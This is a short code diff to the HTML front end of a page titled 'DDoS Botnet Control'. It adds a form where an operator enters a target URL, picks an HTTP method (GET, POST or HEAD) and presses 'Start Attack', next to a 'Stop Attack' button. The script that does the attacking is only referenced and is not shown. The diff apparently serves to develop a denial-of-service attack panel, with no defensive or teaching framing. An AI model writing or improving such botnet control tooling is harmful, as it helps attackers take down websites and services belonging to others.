@@ -7,7 +7,19 @@
 </head>
 <body>
     <h1>DDoS Botnet Control</h1>
-    <button onclick="startAttack()">Start Attack</button>
+    <form id="attackForm">
+        <label for="targetURL">Target URL:</label>
+        <input type="text" id="targetURL" name="targetURL" required>
+        <br><br>
+        <label for="attackType">Attack Type:</label>
+        <select id="attackType" name="attackType">
+            <option value="GET">GET</option>
+            <option value="POST">POST</option>
+            <option value="HEAD">HEAD</option>
+        </select>
+        <br><br>
+        <button type="submit">Start Attack</button>
+    </form>
     <button onclick="stopAttack()">Stop Attack</button>
     <script src="/app.js"></script>
 </body>
